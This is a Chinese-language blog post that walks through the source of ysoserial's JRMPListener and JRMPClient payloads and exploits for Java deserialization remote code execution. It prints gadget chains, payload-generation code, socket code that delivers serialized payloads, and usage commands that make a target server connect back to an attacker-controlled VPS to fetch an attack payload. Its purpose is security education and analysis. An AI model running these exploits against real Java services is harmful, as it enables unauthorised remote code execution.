<h4 id="Payloads-JRMPListener"><a href="#Payloads-JRMPListener" class="headerlink" title="Payloads/JRMPListener"></a><code>Payloads/JRMPListener</code></h4><p><code>Payloads/JRMPListener</code>令服务端开启一个RMI监听端口，要求服务端存在一个反序列化的接口，其调用栈如代码注释所写：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Payloads/JRMPListener.java</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject.readObject(ObjectInputStream) line: 235</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject.reexport() line: 266</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject.exportObject(Remote, int) line: 320</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383</span></span><br><span class="line"><span class="comment"> * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208</span></span><br><span class="line"><span class="comment"> * LiveRef.exportObject(Target) line: 147</span></span><br><span class="line"><span class="comment"> * TCPEndpoint.exportObject(Target) line: 411</span></span><br><span class="line"><span class="comment"> * TCPTransport.exportObject(Target) line: 249</span></span><br><span class="line"><span class="comment"> * TCPTransport.listen() line: 319</span></span><br><span class="line"><span class="comment"> **/</span></span><br></pre></td></tr></table></figure>

<p>再来看看payload生成代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPListener</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRemoteObject</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ActivationGroupImpl withConstructor;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRemoteObject <span class="title">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jrmpPort = Integer.parseInt(command);</span><br><span class="line">        <span class="comment">// UnicastRemoteObject是ActivationGroupImpl的父类</span></span><br><span class="line">        <span class="comment">// 继承关系：ActivationGroupImpl-&gt; ActivationGroup -&gt; UnicastRemoteObject</span></span><br><span class="line">        UnicastRemoteObject uro = withConstructor;</span><br><span class="line"></span><br><span class="line">        Reflections.getField(UnicastRemoteObject.class, <span class="string">&quot;port&quot;</span>).set(uro, jrmpPort);</span><br><span class="line">        <span class="keyword">return</span> uro;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ****	SNIP	****    </span></span><br></pre></td></tr></table></figure>

<p>因为<code>ActivationGroupImpl类</code>和 <code>ActivationGroup类</code>都没实现<code>readObject()</code>方法，所以它们会继承其父类的方法。在反序列化过程中就发生了注解中的调用，最终的效果是在服务端开启特定端口。</p>
<h4 id="Exploit-JRMPClient"><a href="#Exploit-JRMPClient" class="headerlink" title="Exploit/JRMPClient "></a><code>Exploit/JRMPClient </code></h4><p>既然打出<code>Payloads/JRMPListener</code>后服务端上多了一个TCP端口，接着我们就可以用<code>Exploit/JRMPClient </code> 发起DGC调用了（DGC，Distributed Gabage Collection，分布式垃圾回收，可以看做RMI协议下的一条指令，用来回收对象调用方不再使用的引用），总之会发生与RMI有关的通信。其实现代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( args.length &lt; <span class="number">4</span> ) &#123;</span><br><span class="line">        System.err.println(JRMPClient.class.getName() + <span class="string">&quot; &lt;host&gt; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由payload_type和payload_arg生成Payload，实际上调用了payloadClass.newInstance().getObject()方法</span></span><br><span class="line">    Object payloadObject = Utils.makePayloadObject(args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br><span class="line">    String hostname = args[ <span class="number">0</span> ];</span><br><span class="line">    <span class="keyword">int</span> port = Integer.parseInt(args[ <span class="number">1</span> ]);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.err.println(String.format(<span class="string">&quot;* Opening JRMP socket %s:%d&quot;</span>, hostname, port));</span><br><span class="line">        makeDGCCall(hostname, port, payloadObject);</span><br><span class="line">        </span><br><span class="line">	<span class="comment">// ****	 SNIP	****</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">makeDGCCall</span> <span class="params">( String hostname, <span class="keyword">int</span> port, Object payloadObject )</span> <span class="keyword">throws</span> IOException, UnknownHostException, SocketException </span>&#123;</span><br><span class="line">        InetSocketAddress isa = <span class="keyword">new</span> InetSocketAddress(hostname, port);</span><br><span class="line">        Socket s = <span class="keyword">null</span>;</span><br><span class="line">        DataOutputStream dos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            s = SocketFactory.getDefault().createSocket(hostname, port);</span><br><span class="line">            s.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">            s.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            OutputStream os = s.getOutputStream();</span><br><span class="line">            dos = <span class="keyword">new</span> DataOutputStream(os);</span><br><span class="line"></span><br><span class="line">            dos.writeInt(TransportConstants.Magic);</span><br><span class="line">            dos.writeShort(TransportConstants.Version);</span><br><span class="line">            dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line"></span><br><span class="line">            dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">            <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">            <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line"></span><br><span class="line">            objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">            objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">            objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">            objOut.writeShort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">            objOut.writeLong(-<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            objOut.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">            os.flush();</span><br><span class="line">            </span><br><span class="line">	<span class="comment">// ****	 SNIP	****</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br></pre></td></tr></table></figure>

<p>最终造成攻击的前提依然是服务端classpath存在payload执行所需的类，<code>makeDGCCall()</code>方法大体过程就是创建一个socket，并按协议约定的格式向其中填入数据。用一个重写了<code>annotateClass()</code>方法的<code>MarshalOutputStream</code>类将PayloadClass也填入socket的缓冲区，最后用<code>flush()</code>发送出去。</p>
<h3 id="Exploit-JRMPListener-——-Payloads-JRMPClient"><a href="#Exploit-JRMPListener-——-Payloads-JRMPClient" class="headerlink" title="Exploit/JRMPListener —— Payloads/JRMPClient"></a>Exploit/JRMPListener —— Payloads/JRMPClient</h3><p>这俩exp也是配套使用，用法如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1.用JRMPClient生成payload</span></span><br><span class="line">java <span class="literal">-jar</span> ysoserial<span class="literal">-xxx</span>.jar JRMPClient [<span class="type">vpsIP</span>]:[<span class="type">port</span>] &gt; payload.bin</span><br><span class="line"><span class="comment">## 2.将payload.bin发送给服务端让其反序列化，这会令服务器上向vps发起连接请求</span></span><br><span class="line"><span class="comment">## 3.这里的vps由我们控制，其上面开启了JRMPListener，在收到连接请求后会将攻击payload发送给它</span></span><br><span class="line">java <span class="literal">-cp</span> ysoserial<span class="literal">-xxx</span>.jar ysoserial.exploit.JRMPListener [<span class="type">port</span>] [<span class="type">payload_type</span>] [<span class="type">payload_arg</span>]</span><br></pre></td></tr></table></figure>

<h4 id="Payloads-JRMPClient"><a href="#Payloads-JRMPClient" class="headerlink" title="Payloads/JRMPClient"></a><code>Payloads/JRMPClient</code></h4><p>payload的生成过程如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">    RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">    <span class="comment">// 创建一个Registry接口的代理对象proxy，它被作为payload返回</span></span><br><span class="line">    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Registry.class &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在生成的payload被反序列化过程中，因为JDK动态代理实际上是生成了$Proxy类对象，其成员变量包括InvocationHandler对象，故会对obj对象（RemoteObjectInvocationHandler类）反序列化，会调用该父类RemoteObject类的<code>readObject()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    String refClassName = in.readUTF();</span><br><span class="line">    <span class="keyword">if</span> (refClassName == <span class="keyword">null</span> || refClassName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        ref = (RemoteRef) in.readObject();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String internalRefClassName = RemoteRef.packagePrefix + <span class="string">&quot;.&quot;</span> + refClassName;</span><br><span class="line">        Class refClass = Class.forName(internalRefClassName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ref = (RemoteRef) refClass.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123; </span><br><span class="line">            <span class="comment">// **** SNIP ****</span></span><br><span class="line">        &#125;</span><br><span class="line">        ref.readExternal(in);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依据payload的生成过程，可知<code>refClassName</code>实际上是<code>UnicastRef.class</code>，因此会进入else子句，并开启<code>ref.readExternal(in)</code>。后面的调用过程不再详述，具体见下图，最终建立一个TCPEndpoint，向我们控制的vps发送DGC请求，这个过程实际和RMIRegistry的DGC部分一致。</p>
<p><img src="payloads_client.jpg"></p>
<h4 id="Exploit-JRMPListener"><a href="#Exploit-JRMPListener" class="headerlink" title="Exploit/JRMPListener"></a><code>Exploit/JRMPListener</code></h4><p>JRMPListener所做的工作是接受这一请求，再生成攻击payload并发送回去。代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( args.length &lt; <span class="number">3</span> ) &#123;</span><br><span class="line">        System.err.println(JRMPListener.class.getName() + <span class="string">&quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;</span>);</span><br><span class="line">        System.exit(-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里根据命令行参数生成payload</span></span><br><span class="line">    <span class="keyword">final</span> Object payloadObject = Utils.makePayloadObject(args[ <span class="number">1</span> ], args[ <span class="number">2</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> port = Integer.parseInt(args[ <span class="number">0</span> ]);</span><br><span class="line">        System.err.println(<span class="string">&quot;* Opening JRMP listener on &quot;</span> + port);</span><br><span class="line">        JRMPListener c = <span class="keyword">new</span> JRMPListener(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Listener error&quot;</span>);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">    Utils.releasePayload(args[<span class="number">1</span>], payloadObject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Socket s = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> ( !<span class="keyword">this</span>.exit &amp;&amp; ( s = <span class="keyword">this</span>.ss.accept() ) != <span class="keyword">null</span> ) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    s.setSoTimeout(<span class="number">5000</span>);</span><br><span class="line">                    InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();</span><br><span class="line">                    System.err.println(<span class="string">&quot;Have connection from &quot;</span> + remote);</span><br><span class="line"></span><br><span class="line">                    InputStream is = s.getInputStream();</span><br><span class="line">                    InputStream bufIn = is.markSupported() ? is : <span class="keyword">new</span> BufferedInputStream(is);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Read magic (or HTTP wrapper)</span></span><br><span class="line">                    bufIn.mark(<span class="number">4</span>);</span><br><span class="line">                    DataInputStream in = <span class="keyword">new</span> DataInputStream(bufIn);</span><br><span class="line">                    <span class="keyword">int</span> magic = in.readInt();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">short</span> version = in.readShort();</span><br><span class="line">                    <span class="keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;</span><br><span class="line">                        s.close();</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    OutputStream sockOut = s.getOutputStream();</span><br><span class="line">                    BufferedOutputStream bufOut = <span class="keyword">new</span> BufferedOutputStream(sockOut);</span><br><span class="line">                    DataOutputStream out = <span class="keyword">new</span> DataOutputStream(bufOut);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span> protocol = in.readByte();</span><br><span class="line">                    <span class="keyword">switch</span> ( protocol ) &#123;</span><br><span class="line">                        <span class="keyword">case</span> TransportConstants.StreamProtocol:</span><br><span class="line">             				<span class="comment">// **** SNIP ****</span></span><br><span class="line">                        <span class="keyword">case</span> TransportConstants.SingleOpProtocol:</span><br><span class="line">                            doMessage(s, in, out, <span class="keyword">this</span>.payloadObject);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">case</span> TransportConstants.MultiplexProtocol:</span><br><span class="line">                            System.err.println(<span class="string">&quot;Unsupported protocol&quot;</span>);</span><br><span class="line">                            s.close();</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bufOut.flush();</span><br><span class="line">                    out.flush();</span><br><span class="line"> 			<span class="comment">// **** SNIP ****</span></span><br><span class="line">&#125;</span><br><span class="line">                </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doMessage</span> <span class="params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	System.err.println(<span class="string">&quot;Reading message...&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> op = in.read();</span><br><span class="line">    <span class="keyword">switch</span> ( op ) &#123;</span><br><span class="line">        <span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">            <span class="comment">// service incoming RMI call</span></span><br><span class="line">            doCall(in, out, payload);</span><br><span class="line">	<span class="comment">// **** SNIP ****</span></span><br><span class="line">&#125;      </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doCall</span> <span class="params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in) &#123;</span><br><span class="line"></span><br><span class="line">    ObjID read;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">        read = ObjID.read(ois);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">catch</span> ( java.io.IOException e ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( read.hashCode() == <span class="number">2</span> ) &#123;</span><br><span class="line">        ois.readInt(); <span class="comment">// method</span></span><br><span class="line">        ois.readLong(); <span class="comment">// hash</span></span><br><span class="line">        System.err.println(<span class="string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	System.err.println(<span class="string">&quot;Sending return with payload for obj &quot;</span> + read);</span><br><span class="line"></span><br><span class="line">    out.writeByte(TransportConstants.Return);<span class="comment">// transport op</span></span><br><span class="line">    <span class="comment">// 生成MarshallOutputStream类的oos对象，开始写入payload对象</span></span><br><span class="line">	ObjectOutputStream oos = <span class="keyword">new</span> JRMPClient.MarshalOutputStream(out, <span class="keyword">this</span>.classpathUrl);</span><br><span class="line">    <span class="comment">// 返回数据类型为异常类</span></span><br><span class="line">	oos.writeByte(TransportConstants.ExceptionalReturn);</span><br><span class="line">	<span class="keyword">new</span> UID().write(oos);</span><br><span class="line"></span><br><span class="line">	BadAttributeValueExpException ex = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">	Reflections.setFieldValue(ex, <span class="string">&quot;val&quot;</span>, payload);</span><br><span class="line">	oos.writeObject(ex);</span><br><span class="line"></span><br><span class="line">	oos.flush();</span><br><span class="line">	out.flush();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">this</span>.hadConnection = <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">synchronized</span> ( <span class="keyword">this</span>.waitLock ) &#123;</span><br><span class="line">		<span class="keyword">this</span>.waitLock.notifyAll();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>

<p>这里生成payload实际用的CommonsCollections5中<code>BadAttributeValueExpException.val</code>成员变量做的最外层包裹，实际的反序列化过程可以看做CommonsCollections5和payload调用链的组合。这里也不再赘述。下图为JRMPListener的打印信息。</p>
<p><img src="vps_Listener.jpg"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6660">https://xz.aliyun.com/t/6660</a> </li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2649">https://xz.aliyun.com/t/2649</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2651">https://xz.aliyun.com/t/2651</a> </li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2650">https://xz.aliyun.com/t/2650</a> </li>
<li><a href="">https://www.cnblogs.com/yeyang/p/10087293.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194384">https://www.anquanke.com/post/id/194384</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190468">https://www.anquanke.com/post/id/190468</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">L1nf3ng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/">http://example.com/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Linf3ng's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post_share"><div class="social-share" data-image="/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/java_cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/03/Tomcat-AJP%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88CVE-2020-1938%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><img class="prev-cover" src="/2021/04/03/Tomcat-AJP%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88CVE-2020-1938%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/cover.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Tomcat AJP本地文件包含（CVE-2020-1938）漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/2019/11/05/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E4%BA%94%EF%BC%89/"><img class="next-cover" 